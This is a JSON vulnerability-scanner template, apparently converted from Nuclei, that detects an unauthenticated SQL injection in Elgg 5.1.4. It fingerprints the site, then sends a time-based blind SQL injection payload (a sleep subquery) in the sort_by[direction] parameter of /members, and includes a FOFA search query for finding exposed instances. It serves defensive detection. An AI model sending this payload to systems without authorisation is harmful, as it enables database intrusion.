@@ -1,0 +1,185 @@
+{
+  "id": "elgg-sqli",
+  "name": "Elgg 5.1.4 - SQL Injection",
+  "author": "s4e-io",
+  "severity": "HIGH",
+  "description": "Elgg 5.1.4 version has a SQL Injection vulnerability in the sort_by[direction] parameter. This vulnerability allows an unauthenticated attacker to manipulate SQL queries by injecting malicious SQL code, potentially leading to unauthorized data access or database compromise. No user authentication is required to exploit this vulnerability.\n",
+  "references": [
+    "https://github.com/4rdr/proofs/blob/main/info/Elgg_unauth_SQLi_5.1.4.md",
+    "https://github.com/Elgg/Elgg"
+  ],
+  "tags": [
+    "elgg",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "http(1) \u0026\u0026 http(2)",
+  "searchQueries": {
+    "fofa": "icon_hash\u003d\"413602919\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET / HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(body,\"elgg.js\")",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_1",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "@timeout 20s\nGET /members?sort_by%5Bproperty%5D\u003dname\u0026sort_by%5Bproperty_type%5D\u003dmetadata\u0026sort_by%5Bdirection%5D\u003ddesc%2c(select*from(select(sleep(6)))a) HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "duration \u003e\u003d 6",
+            "contains(body,\"All members\")",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "elgg-sqli",
+    "info": {
+      "name": "Elgg 5.1.4 - SQL Injection",
+      "author": "s4e-io",
+      "severity": "high",
+      "description": "Elgg 5.1.4 version has a SQL Injection vulnerability in the sort_by[direction] parameter. This vulnerability allows an unauthenticated attacker to manipulate SQL queries by injecting malicious SQL code, potentially leading to unauthorized data access or database compromise. No user authentication is required to exploit this vulnerability.\n",
+      "reference": [
+        "https://github.com/4rdr/proofs/blob/main/info/Elgg_unauth_SQLi_5.1.4.md",
+        "https://github.com/Elgg/Elgg"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "icon_hash\u003d\"413602919\""
+      },
+      "tags": "elgg,sqli"
+    },
+    "flow": "http(1) \u0026\u0026 http(2)",
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET / HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(body,\"elgg.js\")",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "@timeout 20s\nGET /members?sort_by%5Bproperty%5D\u003dname\u0026sort_by%5Bproperty_type%5D\u003dmetadata\u0026sort_by%5Bdirection%5D\u003ddesc%2c(select*from(select(sleep(6)))a) HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "duration \u003e\u003d 6",
+              "contains(body,\"All members\")",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
